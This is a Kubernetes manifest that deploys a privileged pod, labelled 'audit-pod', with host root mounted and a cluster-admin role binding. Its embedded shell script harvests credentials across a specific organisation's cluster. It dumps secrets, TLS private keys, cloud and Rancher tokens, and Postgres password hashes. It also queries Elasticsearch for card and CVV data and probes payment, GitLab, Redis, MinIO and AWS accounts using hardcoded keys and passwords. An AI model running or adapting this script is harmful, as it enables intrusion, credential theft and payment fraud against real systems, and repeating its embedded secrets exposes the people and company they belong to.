
apiVersion: apps/v1
kind: Deployment
metadata:
  name: audit-pod
  namespace: egam-production
  labels:
    app: audit-pod
spec:
  replicas: 1
  selector:
    matchLabels:
      app: audit-pod
  template:
    metadata:
      labels:
        app: audit-pod
    spec:
      hostNetwork: true
      hostPID: true
      serviceAccountName: admin-sa
      containers:
      - name: shell
        image: alpine:3.20
        command:
          - /bin/sh
          - -c
          - |
            export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
            export AWS_PAGER=""

            echo "=== [0] BOOTSTRAP ==="
            apk add --no-cache curl jq bash openssh-client postgresql-client redis openssl bind-tools 2>&1 | tail -2

            if ! command -v kubectl >/dev/null 2>&1; then
              curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
            fi

            echo "=== [1] NODES ==="
            kubectl get nodes -o wide 2>&1

            echo "=== [2] NAMESPACES ==="
            kubectl get ns 2>&1

            echo "=== [3] SECRETS FILTERED (creds) ==="
            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("password|passwd|token|secret|key|cred|cloud|aws|access|user|login|email|database|db_|postgres|mysql|mongo|redis|oracle|stripe|pagar"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -vE ': *$'

            echo "=== [4] VELERO AWS FULL ==="
            kubectl get secret -n kube-system velero -o json 2>&1 | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"' 2>&1

            echo "=== [5] EXTERNAL-DNS FULL ==="
            for ns in egam-staging-main egam-production-main kube-system; do
              echo "--- $ns ---"
              kubectl get secret -n $ns external-dns-aws -o json 2>&1 | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"' 2>&1
            done

            echo "=== [6] ADMIN SA TOKEN ==="
            kubectl create token admin-sa -n egam-production --duration=8760h 2>&1
            kubectl create token admin-sa -n kube-system --duration=8760h 2>&1

            echo "=== [7] TLS KEYS (names only) ==="
            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data["tls.key"] != null) | .metadata.namespace + "/" + .metadata.name' 2>&1

            echo "=== [8] TLS KEYS (first 3, full) ==="
            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data["tls.key"] != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data["tls.key"] | @base64d)' 2>&1 | head -100

            echo "=== [9] CONFIGMAPS CREDS ==="
            kubectl get configmaps -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("user|login|email|password|admin|token|key|url|endpoint"; "i")) | .key + "=" + .value) | join(" | "))' 2>&1 | grep -vE ': *$'

            echo "=== [10] RANCHER ==="
            kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>&1 | jq -r '.data.kubeconfig | @base64d' 2>&1
            RTOKEN=$(kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>&1 | jq -r '.data.kubeconfig | @base64d' 2>&1 | awk '/token:/{print $2}' | head -1)
            echo "RTOKEN_LEN=${#RTOKEN}"
            curl -sk -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/v3/clusters" 2>&1 | head -c 3000

            echo "=== [11] RANCHER IMPERSONATION ==="
            kubectl get secrets -n cattle-impersonation-system -o json 2>&1 | jq -r '.items[] | select(.data.token != null) | .metadata.name + "=" + (.data.token | @base64d)' 2>&1 | head -5

            echo "=== [12] ELASTIC ==="
            ES=""
            for s in elasticsearch-es-http elasticsearch-master elasticsearch; do
              if kubectl get svc -n elastic-stack $s >/dev/null 2>&1; then ES="https://$s.elastic-stack:9200"; break; fi
            done
            echo "ES=$ES"
            if [ -n "$ES" ]; then
              echo "--- INDICES ---"
              curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" "$ES/_cat/indices?v" 2>&1 | head -30
              echo "--- USERS ---"
              curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" "$ES/_security/user?pretty" 2>&1 | head -c 3000
              echo "--- SEARCH ---"
              curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" -H 'Content-Type: application/json' "$ES/*/_search?size=10" -d '{"query":{"bool":{"should":[{"query_string":{"query":"password OR token OR secret OR card OR pan OR cvv OR cpf","lenient":true}}]}}}' 2>&1 | head -c 5000
            fi

            echo "=== [13] PAGARME ==="
            PK="sk_4e35af52a28a441c8d9149fb88a6c818"
            echo "--- BALANCE ---"
            curl -s -u "$PK:" "https://api.pagar.me/core/v5/balance" 2>&1
            echo ""
            echo "--- RECIPIENTS (first 5) ---"
            curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients?size=5" 2>&1 | head -c 3000
            echo ""
            echo "--- CUSTOMERS (first 5) ---"
            curl -s -u "$PK:" "https://api.pagar.me/core/v5/customers?size=5" 2>&1 | head -c 3000
            echo ""
            echo "--- CHARGES (first 5) ---"
            curl -s -u "$PK:" "https://api.pagar.me/core/v5/charges?size=5" 2>&1 | head -c 3000

            echo "=== [14] GITLAB USER ==="
            GL="https://gitlab.dev-gam.com"
            GT="glpat-qZ6RRmfGx8nLBfteMsas"
            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/user" 2>&1
            echo ""
            echo "--- PROJECTS COUNT ---"
            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/projects?per_page=1" -I 2>&1 | grep -i "x-total"
            echo "--- USERS (first 5) ---"
            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/users?per_page=5" 2>&1 | jq -r '.[] | "\(.id) \(.username) \(.email) admin=\(.is_admin)"' 2>&1

            echo "=== [15] POSTGRES 10.10.4.1 ==="
            echo "--- USERS ---"
            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c 'SELECT usename, passwd FROM pg_shadow' 2>&1
            echo "--- DBS ---"
            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c '\l' 2>&1
            echo "--- TABLES ---"
            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c '\dt' 2>&1

            echo "=== [16] POSTGRES 10.43.221.138:9999 ==="
            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c '\dt' 2>&1

            echo "=== [17] REDIS ==="
            for ns in dados-production dados-staging; do
              for svc in redis-master redis; do
                if kubectl get svc -n $ns $svc >/dev/null 2>&1; then
                  echo "--- $ns/$svc ---"
                  redis-cli -h "$svc.$ns.svc.cluster.local" -p 6379 -a vni9WO2p32fP --no-auth-warning ping 2>&1
                  redis-cli -h "$svc.$ns.svc.cluster.local" -p 6379 -a vni9WO2p32fP --no-auth-warning keys '*' 2>&1 | head -20
                fi
              done
            done

            echo "=== [18] MINIO ==="
            curl -sk -o /tmp/mc "https://dl.min.io/client/mc/release/linux-amd64/mc" && chmod +x /tmp/mc
            /tmp/mc alias set egam https://minio-api.production.egam.com.br RIDNVb76icNZfcShvaQa OevVynurkK1NChS0ZcJkNjhj7MoKs8fjReQmNUH1 --insecure 2>&1
            /tmp/mc ls egam 2>&1

            echo "=== [19] AWS TEST ==="
            AK=$(kubectl get secret -n kube-system velero -o json 2>&1 | jq -r '.data.cloud | @base64d' 2>&1 | grep -E "aws_access_key_id" | awk -F'=' '{print $2}' | tr -d ' ')
            SK=$(kubectl get secret -n kube-system velero -o json 2>&1 | jq -r '.data.cloud | @base64d' 2>&1 | grep -E "aws_secret_access_key" | awk -F'=' '{print $2}' | tr -d ' ')
            REG=$(kubectl get secret -n kube-system velero -o json 2>&1 | jq -r '.data.cloud | @base64d' 2>&1 | grep -E "region" | awk -F'=' '{print $2}' | tr -d ' ')
            echo "AK=${AK:0:10}... SK_LEN=${#SK} REG=$REG"
            if [ -n "$AK" ]; then
              export AWS_ACCESS_KEY_ID=$AK
              export AWS_SECRET_ACCESS_KEY=$SK
              export AWS_DEFAULT_REGION=${REG:-us-east-1}
              aws sts get-caller-identity 2>&1
              aws iam list-users 2>&1 | head -20
              aws s3 ls 2>&1
            fi

            echo "=== [20] DONE ==="
            sleep 36000
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-sa
  namespace: egam-production
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-sa-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-sa
  namespace: egam-production
